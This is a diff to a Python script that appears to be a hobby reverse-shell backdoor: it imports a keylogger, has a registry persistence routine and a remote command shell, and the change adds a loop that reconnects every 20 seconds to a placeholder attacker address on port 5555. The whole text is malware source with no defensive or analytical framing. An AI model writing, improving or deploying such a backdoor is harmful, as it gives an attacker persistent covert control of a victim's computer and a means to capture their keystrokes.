@@ -7,6 +7,7 @@ import keylogger
 import threading
 import shutil
 import sys
+import time
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -53,7 +54,17 @@ def persist(reg_name, copy_name):
             reliable_send('[+] Persistence Alreadt Exists')
     except:
         reliable_send('[+] Error Creating Persistence With The Machine')
-            
+      
+def  connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('IP ADDRESS', 5555))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
 
 def shell():
     count = 0
@@ -97,7 +108,8 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1'), 5555)
-shell()
+# s.connect(('127.0.0.1'), 5555)
+# shell()
+connection()
 
 
